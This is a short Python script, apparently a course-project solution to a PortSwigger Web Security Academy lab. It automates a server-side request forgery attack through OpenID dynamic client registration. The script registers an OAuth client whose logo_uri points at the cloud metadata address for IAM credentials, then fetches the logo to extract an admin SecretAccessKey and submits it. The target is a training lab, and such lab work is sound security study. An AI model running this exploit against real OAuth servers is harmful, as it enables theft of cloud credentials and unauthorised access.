# Bradley Thompson
# CS595 Winter 2022 Final Project
# https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration
import json

import requests

from Helpers import parseArgsForSite, searchResponse, checkForSiteLiveness

site = parseArgsForSite('https://aca01f831e9ae809c0b6a606004e0026.web-security-academy.net/')
checkForSiteLiveness(site)
s = requests.Session()

if __name__ == "__main__":
    resp = s.get(f'https://{site}/social-login', allow_redirects=False)

    # Find social login url in <meta> tag content
    social_login_url = searchResponse(resp, 'meta', {'http-equiv': 'refresh'}).get('content').split('url=')[1]
    oauth_site = social_login_url.split('/')[2]
    print(f'Found social media login url: {social_login_url}')
    print('OAuth host: ', oauth_site)

    # Found /reg endpoint by accessing oauth host /.well-known/openid-configuration
    reg_data = {
        "redirect_uris": [
            "https://example.com"
        ],
        "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
    }
    print('Registering client application w/ exploitative logo_uri that server tries to access')
    resp = s.post(f'https://{oauth_site}/reg', data=json.dumps(reg_data), headers={'Content-Type': 'application/json'})
    admin_client_id = json.loads(resp.text)['client_id']
    print(f'Found admin client id: {admin_client_id}')

    # Access oauth site logo path with admin client id to get admin meta data
    resp = s.get(f'https://{oauth_site}/client/{admin_client_id}/logo')
    # Grab target 'SecretAccessKey' from returned data and submit solution
    solution = json.loads(resp.text)['SecretAccessKey']
    print(f'Found admin api key: {solution}\nSubmitting to solve level...')
    s.post(f'https://{site}/submitSolution', data={'answer': solution})
